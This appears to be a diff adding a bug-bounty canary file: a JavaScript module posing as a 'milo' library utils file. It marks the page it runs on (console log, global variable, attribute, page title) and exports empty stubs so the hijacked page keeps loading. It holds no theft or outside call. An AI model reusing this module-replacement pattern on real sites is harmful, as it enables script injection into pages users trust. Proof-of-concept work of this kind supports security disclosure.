@@ -1,0 +1,11 @@
+console.log("zz-bbp-canary-20261105: attacker-authored milo libs utils executed on "+document.domain);
+window.__zz_bbp_canary_20261105 = document.domain;
+document.documentElement.setAttribute("data-zz-bbp-canary","20261105-"+document.domain);
+document.title="zz-bbp-canary-xss-20261105 on "+document.domain;
+export const setConfig=(c)=>({...(c||{})});
+export const getConfig=()=>({});
+export const loadArea=async()=>{};
+export const loadStyle=()=>{};
+export const createTag=(t)=>document.createElement(t||"div");
+export const getMetadata=()=>null;
+export default {};
